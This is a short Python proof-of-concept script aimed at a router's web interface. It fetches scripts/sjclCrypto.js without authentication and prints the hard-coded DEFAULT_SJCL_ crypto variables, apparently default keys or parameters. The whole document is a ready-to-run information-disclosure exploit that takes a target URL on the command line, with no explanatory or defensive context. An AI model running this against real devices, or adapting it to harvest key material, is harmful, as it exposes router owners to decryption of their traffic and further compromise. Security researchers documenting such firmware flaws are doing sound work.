#!/usr/bin/env python3

import sys
import requests

if len(sys.argv) != 2:
	exit(sys.argv[0] + ": http://192.168.0.1")

url = sys.argv[1]

if not "http://" in url and not "https://" in url:
	exit("[-] Invalid url.")

if not url.endswith("/"):
	url += "/"

try:
	resp = requests.get(url + "scripts/sjclCrypto.js", allow_redirects=False, timeout=5)
except requests.ConnectionError:
	exit("[-] Failed to establish connection to router.")

print("[*] HTTP GET " + url + " - " + str(resp.status_code))
if resp.status_code != 200:
	exit("[!] Expected HTTP 200!")

for line in resp.text.split("\n"):
	if line.startswith("var "):
		line = line[4:]

		if "DEFAULT_SJCL_" in line:
			line = line.replace(";", "")

			var = line.split(" = ")[0]
			value = line.split(" = ")[1]

			print(" ~  " + var + " is " + value)

print()
